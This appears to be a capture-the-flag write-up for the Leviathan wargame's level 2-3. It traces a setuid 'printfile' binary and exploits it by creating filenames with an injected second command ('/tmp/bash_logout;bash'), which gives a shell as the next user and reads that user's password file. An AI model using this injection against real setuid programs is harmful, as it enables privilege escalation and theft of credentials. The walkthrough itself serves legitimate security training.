## Leviathan 2-3
Category: `binary`

## Description
There is no information for this level, intentionally.

## Analysis
```
leviathan2@leviathan:~$ ls -al
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan2@leviathan:~$ file printfile 
printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=46891a094764828605a00c0c38abfccbe4b46548, not stripped
```
As always with binary `strings and trace until it is done'
```
leviathan2@leviathan:~$ strings printfile
...
[^_]
*** File Printer ***
Usage: %s filename
You cant have that file...
/bin/cat %s
;*2$"
...
```
As we can see this binary executes `/bin/cat` with given arguments, let's try some arguments 
```
leviathan2@leviathan:~$ ltrace ./printfile .bash_logout
__libc_start_main(0x804852b, 2, 0xffffd774, 0x8048610 <unfinished ...>
access(".bash_logout", 4)                                                                                                                        = 0
snprintf("/bin/cat .bash_logout", 511, "/bin/cat %s", ".bash_logout")                                                                            = 21
geteuid()                                                                                                                                        = 12002
geteuid()                                                                                                                                        = 12002
setreuid(12002, 12002)                                                                                                                           = 0
system("/bin/cat .bash_logout"# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                           = 0
+++ exited (status 0) +++

leviathan2@leviathan:~$ ltrace ./printfile
__libc_start_main(0x804852b, 1, 0xffffd784, 0x8048610 <unfinished ...>
puts("*** File Printer ***"*** File Printer ***
)                                                                                                                     = 21
printf("Usage: %s filename\n", "./printfile"Usage: ./printfile filename
)                                                                                                    = 28
+++ exited (status 255) +++

leviathan2@leviathan:~$ ltrace ./printfile ddd
__libc_start_main(0x804852b, 2, 0xffffd784, 0x8048610 <unfinished ...>
access("ddd", 4)                                                                                                        = -1
puts("You cant have that file..."You cant have that file...
)                                                                                      = 27
+++ exited (status 1) +++
```
Tried executing a binary with an existing file; no argument; no existing file. Summarizing the information we get, we must provide an existing file to execute `/bin/cat %s`, otherwise nothing will happen. Suppose we need to provide special arguments to execute what we want, i.e. command injection
> Command Injection (theory) - https://owasp.org/www-community/attacks/Command_Injection

> Command Injection (examples) - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/df7172dca1c6ee08fdc110045ea653b087ecb971/Command%20Injection/README.md

I spent a lot of time here
```
leviathan2@leviathan:~$ ltrace ./printfile .bash_logout `whoami` 	# nothing
leviathan2@leviathan:~$ ltrace ./printfile .bash_logout $(whoami) 	# nothing
leviathan2@leviathan:~$ ltrace ./printfile ".bash_logout;whoami"
You cant have that file...
```
After 2 hours of trying, I realized that "the binary checks to see if the file exists, what if I inser chain of commands in the name of the file"
```
leviathan2@leviathan:~$ touch "/tmp/bash_logout;whoami"
leviathan2@leviathan:~$ ./printfile $_		# variable $_ inserts last argument
/bin/cat: /tmp/bash_logout: No such file or directory
leviathan3
```
THIS WORKS! Now we need to call shell and read file with password from leviathan3
```
leviathan2@leviathan:~$ touch "/tmp/bash_logout;bash"
leviathan2@leviathan:~$ ./printfile $_
/bin/cat: /tmp/bash_logout: No such file or directory
leviathan3@leviathan:~$ cat /etc/leviathan_pass/leviathan3
leviathan3_password
```

